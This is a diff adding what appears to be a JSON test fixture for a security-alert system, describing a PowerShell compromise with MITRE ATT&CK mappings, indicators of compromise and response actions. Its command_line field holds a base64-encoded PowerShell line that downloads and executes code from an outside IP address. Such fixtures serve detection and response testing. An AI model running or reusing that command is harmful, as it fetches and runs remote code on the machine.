@@ -1,0 +1,80 @@
+{
+    "event_id": "test-001",
+    "event_type": "security_alert",
+    "severity": "high",
+    "status": "active",
+    "timestamp": "2026-01-18T12:30:45Z",
+    "host": {
+        "hostname": "TEST-ENDPOINT-01",
+        "ip": "10.0.10.15",
+        "os": "Windows 10"
+    },
+    "user": {
+        "username": "testuser",
+        "role": "standard_user"
+    },
+    "process": {
+        "name": "powershell.exe",
+        "parent": "cmd.exe",
+        "command_line": "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMwAzAC4AMwAyAC4AMQA1ADYALwAnACkA"
+    },
+    "network": {
+        "destination_ip": "45.33.32.156",
+        "destination_port": 443,
+        "protocol": "HTTPS",
+        "reputation": "malicious"
+    },
+    "persistence": {
+        "method": "Scheduled Task",
+        "name": "WindowsUpdateService"
+    },
+    "privilege_escalation": {
+        "attempted": true,
+        "new_privilege": "SYSTEM"
+    },
+    "mitre_attack": {
+        "tactics": [
+            "Execution",
+            "Persistence",
+            "Privilege Escalation",
+            "Command and Control"
+        ],
+        "techniques": [
+            {
+                "id": "T1059.001",
+                "name": "PowerShell"
+            },
+            {
+                "id": "T1053",
+                "name": "Scheduled Task"
+            },
+            {
+                "id": "T1548.002",
+                "name": "UAC Bypass"
+            },
+            {
+                "id": "T1071.001",
+                "name": "Web Protocols"
+            }
+        ]
+    },
+    "ioc": {
+        "ips": [
+            "45.33.32.156"
+        ],
+        "processes": [
+            "powershell.exe"
+        ],
+        "users": [
+            "testuser"
+        ]
+    },
+    "response": {
+        "recommended_actions": [
+            "isolate_host",
+            "terminate_process",
+            "delete_scheduled_task",
+            "block_ip"
+        ]
+    }
+}
